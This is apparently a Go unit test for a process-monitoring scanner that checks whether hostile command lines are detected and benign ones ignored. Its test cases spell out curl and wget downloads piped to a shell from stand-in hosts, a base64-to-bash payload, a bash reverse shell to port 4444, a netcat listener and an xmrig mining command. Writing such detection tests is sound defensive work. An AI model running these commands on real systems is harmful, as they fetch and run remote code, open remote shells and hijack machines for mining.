package procmon

import "testing"

func TestScan_DetectsKnownPatterns(t *testing.T) {
	cases := []struct {
		name    string
		cmd     string
		want    string
	}{
		{"curl pipe bash", `curl -sL http://evil.example/install.sh | bash`, "curl-piped-to-shell"},
		{"wget pipe sh", `wget -qO- http://x.com/x.sh | sh`, "wget-piped-to-shell"},
		{"base64 decode pipe", `echo Y3VybCBldmlsCg== | base64 --decode | bash`, "base64-decode-pipe-shell"},
		{"reverse shell", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, "reverse-shell-bash-tcp"},
		{"netcat listener", `nc -lvp 4444`, "netcat-listener"},
		{"miner pool", `xmrig -o stratum+tcp://pool.example:3333 -u XYZ`, "miner-pool-stratum"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := Scan([]Process{{PID: 1, Name: "test", Cmdline: tc.cmd}})
			if len(f) != 1 {
				t.Fatalf("got %d findings, want 1", len(f))
			}
			if f[0].Pattern != tc.want {
				t.Errorf("pattern = %s, want %s", f[0].Pattern, tc.want)
			}
		})
	}
}

func TestScan_IgnoresBenign(t *testing.T) {
	benign := []Process{
		{PID: 1, Name: "vim", Cmdline: "vim /etc/hosts"},
		{PID: 2, Name: "go", Cmdline: "go test ./..."},
		{PID: 3, Name: "kubectl", Cmdline: "kubectl get pods -A"},
	}
	if f := Scan(benign); len(f) != 0 {
		t.Errorf("got %d findings on benign, want 0: %+v", len(f), f)
	}
}
